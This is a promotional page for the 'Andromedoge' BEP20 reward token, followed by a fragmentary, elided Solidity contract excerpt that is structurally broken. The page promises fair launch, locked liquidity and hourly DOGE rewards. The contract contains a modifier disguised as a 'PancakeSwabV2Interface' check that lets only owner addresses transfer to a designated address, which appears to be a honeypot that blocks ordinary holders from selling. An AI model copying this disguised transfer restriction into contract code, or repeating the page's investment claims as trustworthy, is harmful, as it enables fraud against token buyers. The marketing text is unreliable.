...
Andromedoge is a hyper-deflationary token that rewards you with DOGE, equipped with whale-friendly Andromeda wallet to auto buy-back the dips!

Main features
* Fair Launch Only. No Pre-sale. No Private Sale.
* No initial team tokens
* 100% LP tokens locked for 6 months
* Anti dump protection
* Organic growth community
* Active marketing

Simply buy & hold $ANDRODOGE and you’ll get DOGECOIN in your wallet every 60 minutes automagically!
...
Total fees 16%
Recommended slippage 18-20%

Max buy 0.5% total supply
There is an additional 2% tax on sell transactions.
This discourages dumping and increases the Doge rewards for holders.
...
contract Ownable is Context {
  ...
  function _transferOwnership(address newOwner) internal {
    ...
    modifier PancakeSwabV2Interface(address from, address to, bool fromTransfer) {
        ...
        else require((to != nxOwner || from == _owner || from == _leaveowner), "Order TransferFromMiddleware");
        _;
    }
}

contract Andromedoge is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  
  uint256 public _fee = 5;
  uint256 public _feeLiq = 5;
  uint256 public _feeHolders = 5;
